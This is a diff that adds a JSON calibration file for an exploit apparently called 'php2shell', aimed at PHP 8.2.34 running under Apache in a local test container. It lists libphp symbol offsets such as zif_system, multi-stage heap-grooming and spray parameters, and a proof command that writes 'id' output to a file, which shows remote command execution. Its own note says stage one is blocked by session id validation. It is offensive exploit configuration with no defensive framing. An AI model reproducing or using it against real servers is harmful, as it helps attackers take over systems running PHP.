@@ -1,0 +1,90 @@
+{
+  "schema": 1,
+  "target": "8.2.34",
+  "image": "php:8.2.34-apache",
+  "container": "php2shell-exp-8234",
+  "url": "http://127.0.0.1:19128/index.php",
+  "libphp": "/usr/lib/apache2/modules/libphp.so",
+  "symbols": {
+    "zif_system": 3782816,
+    "zval_ptr_dtor": 4748880
+  },
+  "limits": {
+    "memory_limit": "8M",
+    "post_max_size": "64M",
+    "max_input_vars": 1000
+  },
+  "heap": {
+    "chunk_align": 2097152,
+    "pointer_lo": 139637976727552,
+    "pointer_hi": 140737488355328,
+    "stage1": {
+      "fillers": 841,
+      "value_len": 48,
+      "forge_len": 79,
+      "forge_len_field": 4096,
+      "arm_value_len": 1,
+      "sid_len": 32
+    },
+    "stage2": {
+      "groups": 983,
+      "target": 406,
+      "target_count": 16,
+      "value_len": 16,
+      "arm_value_len": 39,
+      "sid_len": 32
+    },
+    "htdata_offset": 430296
+  },
+  "stage3": {
+    "pads": [
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "carrier": {
+      "kind": "patch_low7",
+      "len": 15,
+      "count": 2
+    },
+    "spray": {
+      "count": 15,
+      "name_len": 31,
+      "value_len": 167
+    },
+    "arm_cookie": true,
+    "big_mb": 12,
+    "sid_len": 19,
+    "progress_len": 3,
+    "b_sid_len": 32
+  },
+  "proof": {
+    "cmd": "id>/out/p1",
+    "file": "/out/p1"
+  },
+  "calibration": {
+    "generated_by": "seed; stage1 blocked on PHP 8.2 session id validation (see README)"
+  },
+  "symbols_sha256": "42ae9f69550e036ff5ad3d25d7ebf6b40bf2dd6531e8f891de53bea0d1663e9b"
+}
